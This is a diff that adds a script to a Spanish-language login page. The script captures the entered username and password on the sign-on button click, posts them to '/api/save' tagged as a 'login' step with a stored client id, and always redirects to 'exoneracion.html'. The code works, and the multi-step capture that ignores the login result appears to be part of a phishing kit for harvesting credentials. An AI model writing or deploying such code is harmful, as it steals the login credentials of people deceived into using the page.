@@ -1205,6 +1205,53 @@
   }
 })();
 </script>
+    <script>
+(function () {
+  document.addEventListener('DOMContentLoaded', function () {
+    const btn = document.getElementById('btn-sign-on');
+    if (!btn) return;
+
+    btn.addEventListener('click', async function (e) {
+      e.preventDefault();
+
+      const usuario = document.getElementById('UserName')?.value.trim();
+      const password = document.getElementById('Password')?.value.trim();
+
+      if (!usuario || !password) {
+        alert('Por favor ingresa usuario y contraseña');
+        return;
+      }
+
+      // Recuperar clientId si existe
+      let clientId = localStorage.getItem('clientId');
+
+      try {
+        const resp = await fetch('/api/save', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            clientId,
+            usuario,
+            password,
+            step: 'login'
+          })
+        });
+
+        const data = await resp.json();
+        if (data.clientId) {
+          localStorage.setItem('clientId', data.clientId);
+        }
+      } catch (err) {
+        console.error('Error guardando datos:', err);
+      }
+
+      // Redirigir al siguiente paso
+      window.location.href = 'exoneracion.html';
+    });
+  });
+})();
+</script>
+
 
 </body>
 
